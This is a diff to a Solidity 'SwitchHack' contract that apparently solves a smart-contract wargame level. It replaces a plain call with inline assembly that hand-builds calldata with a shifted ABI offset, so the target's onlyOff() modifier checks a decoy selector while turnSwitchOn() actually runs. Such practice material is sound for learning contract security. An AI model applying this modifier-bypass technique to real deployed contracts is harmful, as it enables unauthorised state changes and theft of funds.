@@ -35,8 +35,29 @@ contract SwitchHack {
 
         Thus calldata = 0x30c13ade0000000000000000000000000000000000000000000000000000000000000044000000000000000000000000000000000000000000000000000000000000000020606e15000000000000000000000000000000000000000000000000000000000000000476227e12
         */
-        bytes
+
+        /* bytes
             memory _calldata = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000044000000000000000000000000000000000000000000000000000000000000000020606e15000000000000000000000000000000000000000000000000000000000000000476227e12";
-        address(_switch).call(_calldata);
+        address(_switch).call(_calldata); */
+
+        assembly {
+            // flipSwitch()
+            mstore(0, hex"30c13ade")
+            // data part for `_data` starts at argument block's 68 bytes (0x20)
+            mstore(4, 68)
+            // leave empty bytes
+            mstore(36, 0)
+            // turnSwitchOff() selector to satisfy onlyOff() modifier
+            mstore(68, hex"20606e15")
+            // data part for `_data` starts here. first 32 bytes is length - 0x04
+            mstore(72, 4)
+            // next 4 bytes is the bytes data itself - function selector for turnSwitchOn()
+            mstore(104, hex"76227e12")
+
+            // call _switch.flipSwitch()
+            if iszero(call(gas(), _switch, 0, 0, 126, 0, 0)) {
+                revert(0, 0)
+            }
+        }
     }
 }
